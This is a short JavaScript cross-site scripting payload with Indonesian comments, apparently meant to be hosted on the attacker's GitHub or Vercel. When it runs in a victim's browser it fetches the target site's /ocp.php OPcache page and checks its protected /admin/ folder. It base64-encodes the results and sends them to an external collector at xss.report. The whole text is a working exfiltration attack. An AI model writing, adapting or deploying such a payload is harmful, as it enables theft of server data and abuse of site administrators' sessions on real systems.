// Update di GitHub/Vercel kamu
(async () => {
    const report = (key, val) => fetch(`https://xss.report/c/skizaniza?${key}=${btoa(val)}`);
    
    // Tarik daftar file dari Opcache (ocp.php)
    try {
        let res = await fetch('/ocp.php');
        let text = await res.text();
        if (text.includes('Zend OPcache')) report('ocp_leaked', text.slice(0, 2000));
    } catch(e) {}

    // Cek folder admin yang terproteksi
    try {
        let res = await fetch('/admin/');
        if (res.ok) report('admin_access', 'Accessible via Admin Session');
    } catch(e) {}
})();
